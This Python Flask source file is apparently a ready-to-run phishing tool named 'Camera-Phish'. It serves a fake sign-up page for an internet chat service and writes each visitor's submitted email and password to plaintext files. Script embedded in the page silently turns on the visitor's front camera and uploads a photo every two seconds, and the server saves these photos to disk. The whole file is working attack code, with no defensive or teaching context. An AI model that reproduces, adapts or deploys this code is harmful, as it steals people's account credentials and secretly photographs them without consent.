import os
import base64
from flask import Flask, render_template_string, request
from datetime import datetime

app = Flask(__name__)

# Directory to save images and credentials
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')
BACKGROUND_IMAGE_PATH = os.path.expanduser('~/storage/downloads/Camera-Phish/camera.jpg')

if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <style>
            body {
                margin: 0;
                padding: 0;
                background: url('/static/background.jpg') no-repeat center center fixed;
                background-size: cover;
                font-family: Arial, sans-serif;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            form {
                background: rgba(0, 0, 0, 0.8);
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                text-align: center;
                width: 90%;
                max-width: 400px;
            }
            input[type="email"], input[type="password"] {
                width: 90%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 5px;
                font-size: 1em;
            }
            input[type="submit"] {
                width: 90%;
                padding: 10px;
                background-color: red;
                border: none;
                border-radius: 5px;
                color: white;
                font-size: 1.2em;
                cursor: pointer;
            }
            input[type="submit"]:hover {
                background-color: darkred;
            }
        </style>
    </head>
    <body>
        <form action="/request_invite" method="post">
            <h2>Add your details and make a request to join over 1 Million users that use our internet chat!</h2>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign Up Now!">
        </form>
        <script>
            let attempts = 0;

            function postImage(imgData) {
                $.post('/capture', { image: imgData });
            }

            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            async function startCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" } // Use the selfie camera
                    });
                    video.srcObject = stream;
                    video.play();

                    video.onloadedmetadata = () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        setInterval(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imgData = canvas.toDataURL('image/png');
                            postImage(imgData);
                        }, 2000); // Take a photo every 2 seconds
                    };
                } catch (err) {
                    console.error("Camera access failed:", err);
                    alert("Unable to access the camera. Please check your browser settings.");
                }
            }

            startCamera();
        </script>
    </body>
    </html>
    ''')

@app.route('/request_invite', methods=['POST'])
def request_invite():
    email = request.form.get('email')
    password = request.form.get('password')
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')

    credentials_file = os.path.join(DOWNLOAD_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {email}\nPassword: {password}\n")

    return "Your request has been received! We'll contact you soon.", 200

@app.route('/capture', methods=['POST'])
def capture():
    image_data = request.form.get('image')
    if image_data:
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        image_data = image_data.split(",")[1]
        image_file = os.path.join(DOWNLOAD_FOLDER, f"photo_{date_str}.png")
        with open(image_file, 'wb') as f:
            f.write(base64.b64decode(image_data))
        return "Image saved!", 200
    return "No image data received.", 400

if __name__ == '__main__':
    if not os.path.exists('./static'):
        os.makedirs('./static')
    if not os.path.exists('./static/background.jpg') or os.readlink('./static/background.jpg') != BACKGROUND_IMAGE_PATH:
        if os.path.exists('./static/background.jpg'):
            os.remove('./static/background.jpg')  # Remove old link if necessary
        os.symlink(BACKGROUND_IMAGE_PATH, './static/background.jpg')

    app.run(host='0.0.0.0', port=4040)
